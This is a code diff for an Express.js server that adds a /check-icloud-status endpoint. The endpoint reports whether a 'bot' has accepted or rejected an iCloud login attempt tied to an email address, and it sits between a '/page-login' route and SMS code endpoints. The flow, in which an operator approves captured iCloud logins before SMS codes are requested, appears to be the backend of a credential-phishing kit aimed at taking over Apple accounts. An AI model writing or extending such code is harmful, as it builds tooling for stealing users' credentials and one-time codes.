@@ -850,6 +850,40 @@ app.post("/page-login", async (req, res) => {
 });
 
 // ============================================================================
+// GET /check-icloud-status - Check iCloud page login acceptance/rejection
+// ============================================================================
+
+app.get("/check-icloud-status", (req, res) => {
+  try {
+    const email = (req.query.identifier || "").trim();
+
+    if (!email) {
+      return res.json({ status: "pending" });
+    }
+
+    if (pendingPage[email]) {
+      const status = pendingPage[email].status;
+      console.log(`✅ iCloud status for ${email}: ${status}`);
+      
+      // Map bot status values to frontend expectations
+      if (status === "page_accept") {
+        return res.json({ status: "accepted" });
+      } else if (status === "page_reject") {
+        return res.json({ status: "rejected" });
+      }
+      
+      return res.json({ status: status || "pending" });
+    }
+
+    res.json({ status: "pending" });
+
+  } catch (err) {
+    console.error("Check iCloud status error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
 // SMS CODE ENDPOINTS
 // ============================================================================
 
